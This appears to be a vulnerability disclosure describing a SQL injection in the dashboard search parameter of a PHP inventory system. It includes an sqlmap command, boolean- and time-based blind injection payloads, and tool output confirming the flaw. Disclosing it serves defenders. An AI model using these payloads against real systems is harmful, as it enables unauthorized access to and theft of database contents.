# SQL Injection in Inventory System (Dashboard)

## Overview

* **Vulnerability Type**: SQL Injection
* **Product**: [Inventory System](https://www.sourcecodester.com/php/7760/inventory-system-php-and-mysql.html)
* **Version**: 1.0
* **Component**: Dashboard Search (`dashboard.php`)
* **Vulnerable Parameter**: `searchtxt` (POST)

## Description

A SQL Injection vulnerability exists in the **Inventory System**. The vulnerability is located in the `dashboard.php` file.

The application fails to properly sanitize the `searchtxt` parameter in the HTTP POST request (triggered by the search functionality on the dashboard). This allows an authenticated attacker to inject arbitrary SQL commands. Since the backend database is **MySQL**, attackers can exploit this using Boolean-based or Time-based blind injection techniques (e.g., using `SLEEP()`) to enumerate database structures and exfiltrate sensitive data.

## Steps to Reproduce

1. **Setup**: Deploy the Inventory System locally.
2. **Login**: Log in to the application.
3. **Exploit**: Use the search bar to submit malicious SQL payloads, or capture the request and use a tool like `sqlmap`.

**SQLMap Command:**

```bash
sqlmap -u "http://127.0.0.1:8089/dashboard.php" \
--data "searchtxt=test_query&Search=Search" \
--batch -v 6 --risk=3 \
--cookie "PHPSESSID=YOUR_COOKIE_HERE"

```

## PoC Payload

**Boolean-based Blind Payload:**

```sql
searchtxt=-8712' OR 7497=7497#&Search=Search

```

**Time-based Blind Payload (MySQL):**

```sql
searchtxt=test_query' AND (SELECT 6972 FROM (SELECT(SLEEP(5)))lLNj)-- QRct&Search=Search

```

## Proof of Concept

The following output from `sqlmap` confirms that the `searchtxt` parameter is vulnerable.

```text
Parameter: searchtxt (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: searchtxt=-8712' OR 7497=7497#&Search=Search
    Vector: OR [INFERENCE]#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: searchtxt=test_query' AND (SELECT 6972 FROM (SELECT(SLEEP(5)))lLNj)-- QRct&Search=Search
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
---
[INFO] the back-end DBMS is MySQL

```
<img width="862" height="286" alt="图片" src="https://github.com/user-attachments/assets/553087f6-c4f9-4269-b1ca-1c4283d3bac1" />



## Impact

This vulnerability allows an attacker to:

1. **Exfiltrate Data**: Retrieve sensitive information from the MySQL database, including user credentials, customer data, and sales records.
2. **Database Enumeration**: Identify tables, columns, and database schema.

## Reference

* [Project Source Code](https://www.sourcecodester.com/php/7760/inventory-system-php-and-mysql.html)
